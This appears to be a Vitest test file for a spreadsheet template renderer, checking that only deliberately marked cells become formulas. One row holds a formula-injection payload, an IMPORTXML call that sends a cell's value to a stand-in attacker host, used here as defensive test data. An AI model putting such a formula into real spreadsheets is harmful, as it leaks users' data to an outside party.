import { describe, expect, it } from 'vitest';
import { formulaCells, renderSheetsValues } from '@/core/template/sheets';
import { formula, type WorkbookSpec } from '@/core/template/types';

function spec(): WorkbookSpec {
  return {
    title: 'Test',
    generatedAt: '2026-11-08T00:00:00.000Z',
    sheets: [
      {
        name: 'Vouchers',
        columns: [{ header: 'Narration', width: 30 }],
        rows: [
          ['=IMPORTXML("https://attacker.example/"&A1,"//x")'],
          [formula('=SUM(A2:A2)', 1)],
        ],
      },
    ],
  };
}

describe('sheet rendering', () => {
  it('promotes only intentional formula cells', () => {
    const formulas = formulaCells(spec()).get('Vouchers');
    expect(formulas).toEqual([{ row: 3, column: 0, formula: '=SUM(A2:A2)' }]);
    expect(renderSheetsValues(spec())[0]?.values[1]?.[0]).toBe(
      '=IMPORTXML("https://attacker.example/"&A1,"//x")',
    );
  });
});
